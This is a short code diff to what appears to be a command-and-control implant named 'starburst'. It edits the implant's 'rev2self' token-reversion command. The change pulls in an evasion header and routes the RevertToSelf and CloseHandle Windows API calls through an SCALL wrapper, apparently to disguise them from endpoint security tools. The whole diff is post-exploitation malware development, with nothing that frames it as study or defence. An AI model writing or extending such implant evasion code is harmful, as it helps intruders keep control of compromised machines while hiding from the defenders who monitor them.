@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_REV2SELF
 
@@ -15,14 +16,14 @@ auto declfn starburst::cmd_rev2self(
     _In_    char*     task_uuid,
     _In_    Parser*   params
 ) -> void {
-    if ( !inst.advapi32.RevertToSelf() ) {
+    if ( !SCALL( inst, advapi32.RevertToSelf ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "RevertToSelf failed" ) ) );
         return;
     }
 
     if ( inst.agent.impersonated_token ) {
-        inst.kernel32.CloseHandle( inst.agent.impersonated_token );
+        SCALL( inst, kernel32.CloseHandle, inst.agent.impersonated_token );
         inst.agent.impersonated_token = nullptr;
     }
 
